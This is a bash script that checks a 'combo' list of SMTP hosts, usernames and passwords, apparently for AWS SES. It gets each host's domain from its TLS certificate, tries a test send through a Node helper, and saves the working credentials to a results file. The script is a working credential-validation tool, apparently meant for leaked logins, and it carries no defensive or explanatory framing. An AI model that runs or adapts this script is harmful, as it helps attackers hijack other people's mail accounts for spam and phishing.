#!/bin/bash

check_ssl() {
    openssl s_client -connect $1:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep DNS: | cut -d: -f2 
}
rm -rf tmp/*
bash src/parser.sh "$1"
while IFS= read -r line; do
    host=$(echo -n "$line" | cut -d':' -f1)
    port=$(echo -n "$line" | cut -d':' -f2)
    username=$(echo -n "$line" | cut -d':' -f3)
    password=$(echo -n "$line" | cut -d':' -f4)
    from=$(echo -n "$line" | cut -d':' -f5)
    domain=$(check_ssl $(cat $1 | grep "$username" |head -n1 | cut -d'/' -f1) | cut -d',' -f1)
    to=$2

    test=$(node src/index.js -h "$host" --port "$port" -u "$username" -p "$password" --from "$from" --to "$to")
    if grep -q "Email address is not verified" <<< $test; then
        echo -e "host: $host\nport: $port\nusername: $username\npassword: $password\ndomain: $domain\n\n" >> results/ses_valid.txt
    fi
done < tmp/combo_ses.txt
